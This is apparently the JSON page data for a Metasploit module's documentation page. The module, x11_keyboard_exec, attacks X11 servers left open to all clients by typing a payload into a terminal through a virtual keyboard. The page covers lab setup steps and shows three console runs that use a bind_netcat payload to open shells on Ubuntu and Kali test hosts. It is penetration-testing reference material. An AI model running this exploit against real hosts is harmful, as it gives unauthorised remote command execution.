{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/unix/x11/x11_keyboard_exec","result":{"data":{"moduleMetadataJson":{"id":"d5e69bf4-6d65-5934-aac1-43164fad25d7","name":"X11 Keyboard Command Injection","fullname":"exploit/unix/x11/x11_keyboard_exec","description":"This module exploits open X11 servers by connecting and registering a\n        virtual keyboard. The virtual keyboard is used to open an xterm or gnome\n        terminal and type and execute the specified payload.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/unix/x11/x11_keyboard_exec","documentationSlug":"/modules/documentation/exploit/unix/x11/x11_keyboard_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>X11 (X Window System) is a graphical windowing system most common on unix/linux.\nThe service can accept connections from any users when misconfigured which is done with the command <code class=\"language-text\">xhost +</code>.</p>\n<p>This exploit has been verified against:</p>\n<ol>\n<li>Ubuntu 14.04</li>\n<li>Ubuntu 16.04</li>\n<li>Kali via Emulation method</li>\n</ol>\n<p>This exploit does NOT work against:</p>\n<ol>\n<li>Solaris 10 Java Desktop System (alt+F2 has no effect)</li>\n</ol>\n<h3 id=\"emulation\" style=\"position:relative;\"><a href=\"#emulation\" aria-label=\"emulation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Emulation</h3>\n<p>This can be emulated (on kali) utilizing the following command: <code class=\"language-text\">socat -d -d TCP-LISTEN:6000,fork UNIX-CONNECT:/tmp/.X11-unix/X0</code></p>\n<h3 id=\"ubuntu-1204-1404\" style=\"position:relative;\"><a href=\"#ubuntu-1204-1404\" aria-label=\"ubuntu 1204 1404 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ubuntu 12.04, 14.04</h3>\n<ol>\n<li><code class=\"language-text\">sudo nano /etc/lightdm/lightdm.conf</code></li>\n<li>\n<p>Under the <code class=\"language-text\">[SeatDefaults]</code> area, add:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">xserver-allow-tcp=true\nallow-guest=true</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n<li>logout or reboot</li>\n<li>\n<p>Verification: <code class=\"language-text\">sudo netstat -antp | grep 6000</code></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      1806/X</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n<li>Now, to verify you allow ANYONE to get on X11, type: <code class=\"language-text\">xhost +</code></li>\n</ol>\n<h3 id=\"ubuntu-1604\" style=\"position:relative;\"><a href=\"#ubuntu-1604\" aria-label=\"ubuntu 1604 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ubuntu 16.04</h3>\n<p>  Use the Ubuntu 12.04 instructions, however change <code class=\"language-text\">SeatDefaults</code> to <code class=\"language-text\">Seat:*</code></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install and configure X11</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/unix/x11/x11_keyboard_exec</code></li>\n<li>Do: <code class=\"language-text\">set rhost [IPs]</code></li>\n<li>Do: <code class=\"language-text\">set payload [payload]</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ubuntu-1404\" style=\"position:relative;\"><a href=\"#ubuntu-1404\" aria-label=\"ubuntu 1404 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ubuntu 14.04</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(x11_keyboard_exec) &gt; set payload cmd/unix/bind_netcat \npayload =&gt; cmd/unix/bind_netcat\nmsf exploit(x11_keyboard_exec) &gt; run\n\n[*] Started bind handler\n[*] 192.168.2.75:6000 - 192.168.2.75:6000 - Register keyboard\n[*] 192.168.2.75:6000 - 192.168.2.75:6000 - Opening &quot;Run Application&quot;\n[*] 192.168.2.75:6000 - 192.168.2.75:6000 - Waiting 5 seconds...\n[*] 192.168.2.75:6000 - 192.168.2.75:6000 - Opening xterm\n[*] 192.168.2.75:6000 - 192.168.2.75:6000 - Waiting 5 seconds...\n[*] 192.168.2.75:6000 - 192.168.2.75:6000 - Typing and executing payload\n[*] Command shell session 1 opened (192.168.2.117:44549 -&gt; 192.168.2.75:4444) at 2017-04-23 15:26:56 -0400\n\nid\nuid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)\ncat /etc/*release\nDISTRIB_ID=Ubuntu\nDISTRIB_RELEASE=14.04\nDISTRIB_CODENAME=trusty\nDISTRIB_DESCRIPTION=&quot;Ubuntu 14.04.5 LTS&quot;\nNAME=&quot;Ubuntu&quot;\nVERSION=&quot;14.04.5 LTS, Trusty Tahr&quot;\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME=&quot;Ubuntu 14.04.5 LTS&quot;\nVERSION_ID=&quot;14.04&quot;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"ubuntu-1604-1\" style=\"position:relative;\"><a href=\"#ubuntu-1604-1\" aria-label=\"ubuntu 1604 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ubuntu 16.04</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(x11_keyboard_exec) &gt; set rhost 192.168.2.26\nrhost =&gt; 192.168.2.26\nmsf exploit(x11_keyboard_exec) &gt; set payload cmd/unix/bind_netcat \npayload =&gt; cmd/unix/bind_netcat\nmsf exploit(x11_keyboard_exec) &gt; exploit\n\n[*] Started bind handler\n[*] 192.168.2.26:6000 - 192.168.2.26:6000 - Register keyboard\n[*] 192.168.2.26:6000 - 192.168.2.26:6000 - Opening &quot;Run Application&quot;\n[*] 192.168.2.26:6000 - 192.168.2.26:6000 - Waiting 5 seconds...\n[*] 192.168.2.26:6000 - 192.168.2.26:6000 - Opening xterm\n[*] 192.168.2.26:6000 - 192.168.2.26:6000 - Waiting 5 seconds...\n[*] 192.168.2.26:6000 - 192.168.2.26:6000 - Typing and executing payload\n[*] Command shell session 2 opened (192.168.2.117:45813 -&gt; 192.168.2.26:4444) at 2017-04-23 15:29:27 -0400\n\nid \nuid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)\ncat /etc/*release\nDISTRIB_ID=Ubuntu\nDISTRIB_RELEASE=16.04\nDISTRIB_CODENAME=xenial\nDISTRIB_DESCRIPTION=&quot;Ubuntu 16.04.1 LTS&quot;\nNAME=&quot;Ubuntu&quot;\nVERSION=&quot;16.04.1 LTS (Xenial Xerus)&quot;\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME=&quot;Ubuntu 16.04.1 LTS&quot;\nVERSION_ID=&quot;16.04&quot;\nUBUNTU_CODENAME=xenial</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"kali-via-emulation\" style=\"position:relative;\"><a href=\"#kali-via-emulation\" aria-label=\"kali via emulation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Kali via Emulation</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(x11_keyboard_exec) &gt; set payload cmd/unix/bind_netcat \npayload =&gt; cmd/unix/bind_netcat\nmsf exploit(x11_keyboard_exec) &gt; set rhost 127.0.0.1\nrhost =&gt; 127.0.0.1\nmsf exploit(x11_keyboard_exec) &gt; run\n\n[*] Started bind handler\n[*] 127.0.0.1:6000 - 127.0.0.1:6000 - Register keyboard\n[*] 127.0.0.1:6000 - 127.0.0.1:6000 - Opening &quot;Run Application&quot;\n[*] 127.0.0.1:6000 - 127.0.0.1:6000 - Waiting 5 seconds...\n[*] 127.0.0.1:6000 - 127.0.0.1:6000 - Opening xterm\n[*] 127.0.0.1:6000 - 127.0.0.1:6000 - Waiting 5 seconds...\n[*] 127.0.0.1:6000 - 127.0.0.1:6000 - Typing and executing payload\n[*] Command shell session 3 opened (127.0.0.1:37909 -&gt; 127.0.0.1:4444) at 2017-04-23 15:35:26 -0400</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"d5e69bf4-6d65-5934-aac1-43164fad25d7"}}}